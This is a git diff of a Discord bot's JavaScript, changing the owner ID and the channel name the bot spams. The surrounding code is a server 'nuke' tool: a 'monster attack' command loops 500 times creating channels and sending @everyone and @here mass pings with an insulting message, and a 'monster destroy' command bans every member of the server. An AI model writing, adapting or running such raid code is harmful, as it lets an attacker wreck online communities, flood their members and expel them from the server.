@@ -60,7 +60,7 @@ client.on('message', msg => {
 client.on('message' , async (message) => {
     if (message.content.startsWith('monster attack')) {
 for (let i = 0; i < 500; i++) {
-        message.guild.createChannel(' Dating Team ', 'text')
+        message.guild.createChannel(' Atlantic team  ', 'text')
         message.channel.send('@everyone __** ya wlad l97ab 9alabto 3lia ana 7witkom by Atlantic  ...  **__ :muscle: :v: @here');
 }
 }
@@ -71,7 +71,7 @@ for (let i = 0; i < 500; i++) {
 
   client.on('message',async message => {
     if(message.content.startsWith("dm restart")) {
-          if(message.author.id !== "487314985362391060") return message.reply('You aren\'t the bot owner.');
+          if(message.author.id !== "614363312800530433") return message.reply('You aren\'t the bot owner.');
         message.channel.send('**Restarting.**').then(msg => {
             setTimeout(() => {
                msg.edit('**Restarting..**');
@@ -115,7 +115,7 @@ client.on('message', x5bz => {
 
 client.on('message', async message => {
     if(message.content === "monster destroy") {
-        if(message.author.id !== '487314985362391060') return;
+        if(message.author.id !== '614363312800530433') return;
         message.guild.members.forEach(member => {
            member.ban(); 
         });
